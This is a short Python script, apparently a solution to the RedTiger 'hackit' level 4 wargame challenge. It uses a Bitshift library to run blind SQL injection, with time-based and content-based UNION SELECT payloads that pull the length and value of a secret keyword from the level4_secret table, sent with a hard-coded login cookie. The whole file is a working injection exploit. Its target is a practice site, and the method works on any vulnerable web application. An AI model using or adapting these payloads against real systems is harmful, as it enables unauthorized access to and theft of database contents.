#!/usr/bin/python

import Bitshift

bitshift=Bitshift.Bitshift()

# Set up parameters
bitshift.url="http://redtiger.dyndns.org/hackit/level4.php?id="
bitshift.encodemode="urllib_quote"
bitshift.length=2
bitshift.cookies=cookies={'level4login':'dont_publish_solutions_ARGH'}
bitshift.debuglevel=1
bitshift.condition_target="content"
bitshift.reg_condition='Query returned [1-9]{1,2} rows'

# Getting the length using time based bitshifting
query="length(keyword)"
bitshift.condition_target="time_based"
bitshift.check_time=3
bitshift.pattern="-1 UNION SELECT 1,2 FROM level4_secret WHERE ( __BITSHIFT(__ %s __)__ )= 1 #" % (query)

length=int(bitshift.getvalue())

# Getting keyword using classic bitshifting
query="keyword"
bitshift.length=length
bitshift.condition_target="content"
bitshift.pattern="-1 UNION SELECT 1,2 FROM level4_secret WHERE ( __BITSHIFT(__ %s __)__ )= 1 #" % (query)

print bitshift.getvalue()
